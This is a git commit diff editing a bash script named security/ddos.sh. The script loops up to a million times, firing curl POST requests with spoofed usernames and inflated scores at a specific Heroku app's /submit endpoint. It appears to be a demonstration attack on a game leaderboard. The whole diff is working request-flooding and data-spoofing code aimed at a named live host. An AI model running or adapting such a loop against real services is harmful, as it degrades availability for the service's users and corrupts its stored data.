9d0fc5d47861f0213143bec1147bd2817066e0b8
Josh Simani <jsimani@gmail.com>
2018-12-17 15:00:56 -0500

    Changed ddos bash screenshot

--- security/ddos.sh
+++ security/ddos.sh
@@ -5,7 +5,7 @@ counter=1
 while [ $counter -le 1000000 ]
 do
 echo $counter
-curl -d --max-time 0.1 "username=Josh&score=12346&grid={}" https://cryptic-brook-57226.herokuapp.com/submit > /dev/null 2> /dev/null
+curl --max-time 0.075 -d "username=DDoS&score=992346&grid={}" http://cryptic-brook-57226.herokuapp.com/submit 
 ((counter++))
 done
 echo All done
